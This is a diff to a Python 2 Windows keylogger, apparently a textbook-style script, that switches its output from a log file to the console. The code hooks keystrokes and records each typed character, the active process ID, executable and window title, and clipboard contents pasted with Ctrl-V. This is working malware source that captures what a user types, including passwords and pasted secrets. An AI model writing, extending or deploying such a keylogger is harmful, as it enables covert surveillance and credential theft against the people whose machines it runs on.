@@ -9,7 +9,6 @@ kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
 
-log = open('log.txt','w')
 
 
 def get_current_process():
@@ -36,9 +35,10 @@ def get_current_process():
 
     # print out the header if we're in the right process
     
-    print >> log
-    print >> log , "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
-    print >> log
+
+    print
+    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+    print 
   
 
     # close handles
@@ -56,7 +56,9 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        print >> log , 'chr(event.Ascii)',
+        
+        print  chr(event.Ascii),
+    
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
@@ -64,9 +66,11 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-            print >> log , "[PASTE] - %s" % (pasted_value),
+            print  "[PASTE] - %s" % (pasted_value),
+           
         else:
-            print >> log , "[%s]" % event.Key,
+            print  "[%s]" % event.Key,
+           
 
     # pass execution to next hook registered 
     return True
